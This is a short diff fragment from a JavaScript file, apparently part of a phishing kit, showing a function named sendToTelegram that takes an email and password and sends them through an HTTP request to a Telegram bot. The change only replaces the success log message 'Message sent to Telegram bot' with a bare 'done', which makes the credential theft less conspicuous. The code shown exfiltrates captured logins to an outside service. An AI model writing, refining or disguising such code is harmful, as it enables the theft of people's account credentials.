@@ -52,7 +52,7 @@ function sendToTelegram(email, password) {
   
   axios.get(apiUrl)
     .then(response => {
-      console.log("Message sent to Telegram bot");
+      console.log("done");
     })
     .catch(error => {
       console.error("Error sending message to Telegram bot:", error);
